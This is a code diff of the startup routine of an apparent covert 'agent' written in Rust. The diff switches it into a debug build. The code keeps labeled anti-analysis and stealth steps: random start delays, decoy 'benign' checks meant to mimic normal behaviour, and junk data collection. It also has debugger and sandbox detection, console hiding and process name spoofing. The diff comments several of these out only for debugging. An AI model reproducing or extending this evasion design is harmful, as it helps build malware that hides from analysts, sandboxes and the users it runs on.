@@ -12,7 +12,7 @@
 // - 异步 I/O
 // - 可修补的服务器配置
 
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
  
  #[allow(unused_imports)]
  use sys_info_collector::{ClientError, Result, stealth, Transport};
@@ -30,23 +30,23 @@
 
      // 0. Initial random delay
      use rand::Rng;
-     let delay = rand::thread_rng().gen_range(5..30); 
-     // println!("[*] Agent starting... (Debug delay: {}s)", delay);
+     let delay = rand::thread_rng().gen_range(1..5); 
+     println!("[*] Agent starting... (Debug delay: {}s)", delay);
      std::thread::sleep(std::time::Duration::from_secs(delay));
  
      // 1. [Benign] Harmless system check to start normal behavioral pattern
      stealth::perform_system_sanity_check();
  
      // 2. [Anti-Analysis] Direct PEB Check for Debugger
-     if stealth::is_debugger_present() {
-         // println!("[!] WARNING: Debugger detected, but proceeding due to Debug Mode.");
-     }
+     // if stealth::is_debugger_present() {
+     //     // println!("[!] WARNING: Debugger detected, but proceeding due to Debug Mode.");
+     // }
 
     // 3. [Benign] Disk space query (very common in system utilities)
     stealth::verify_disk_integrity();
 
     // 4. [Stealth] Hide Window (No longer first, but still early)
-    stealth::hide_console();
+    // stealth::hide_console();
 
     // 5. [Benign] Network env check
     stealth::check_network_config();
@@ -55,9 +55,9 @@
     sys_info_collector::utils::junk_data_collector();
 
     // 7. [Anti-Analysis] Anti-Sandbox Environmental Checks
-    if stealth::is_sandbox() {
-        println!("[!] WARNING: Sandbox features detected, but proceeding due to Debug Mode.");
-    }
+    // if stealth::is_sandbox() {
+    //     println!("[!] WARNING: Sandbox features detected, but proceeding due to Debug Mode.");
+    // }
 
     // 9. Backgrounding and Name Spoofing (Linux)
     #[cfg(target_os = "linux")]
@@ -75,10 +75,12 @@
         let res = run().await;
         if let Err(e) = res {
             println!("\x1b[31m[FATAL ERROR] Agent loop terminated: {:?}\x1b[0m", e);
-            println!("\n[Debug] Press Enter to finish...");
-            let mut _dummy = String::new();
-            let _ = std::io::stdin().read_line(&mut _dummy);
+        } else {
+            println!("[*] Agent loop finished unexpectedly.");
         }
+        println!("\n[Debug] Press Enter to finish...");
+        let mut _dummy = String::new();
+        let _ = std::io::stdin().read_line(&mut _dummy);
     });
 }
 
